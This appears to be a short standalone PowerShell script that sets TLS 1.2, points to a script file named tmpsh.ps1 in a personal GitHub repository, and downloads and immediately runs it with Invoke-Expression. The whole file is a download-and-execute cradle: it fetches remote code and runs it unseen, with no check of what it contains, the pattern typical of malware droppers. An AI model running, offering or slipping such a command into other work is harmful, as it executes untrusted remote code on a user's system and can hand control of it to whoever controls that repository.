[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$scriptUrl = "https://raw.githubusercontent.com/dyaa1997dyaa/never/refs/heads/main/tmpsh.ps1"
Invoke-Expression (New-Object Net.WebClient).DownloadString($scriptUrl)
